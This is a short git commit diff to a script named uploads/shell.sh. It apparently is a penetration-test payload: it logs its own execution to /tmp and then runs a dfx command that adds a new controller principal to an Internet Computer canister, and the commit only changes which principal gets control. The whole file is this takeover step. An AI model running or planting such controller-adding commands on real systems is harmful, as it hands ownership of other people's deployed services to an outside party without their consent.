19d8aceeb73a6a4f4d27b051e653fd7b9eea7572
Vicky Kumar <111136233+vicky0004@users.noreply.github.com>
2025-02-28 16:53:50 +0530

    Update shell.sh

--- uploads/shell.sh
+++ uploads/shell.sh
@@ -1,4 +1,4 @@
 echo "hello"
 #!/bin/bash
 echo "Script executed on $(date) by pentester" >>  /tmp/exe_log.txt
-dfx canister update-settings --add-controller jtk7l-ssmej-zagdh-p2njf-goos3-ffefd-i47xm-5ypqp-j3zl3-ugghp-123 avqkn-guaaa-aaaaa-qaaea-cai
+dfx canister update-settings --add-controller rbmbb-ruylw-25btp-lj7lf-hapvs-y6bi5-m2l4c-eys6g-tp26w-vrv7h-gae avqkn-guaaa-aaaaa-qaaea-cai
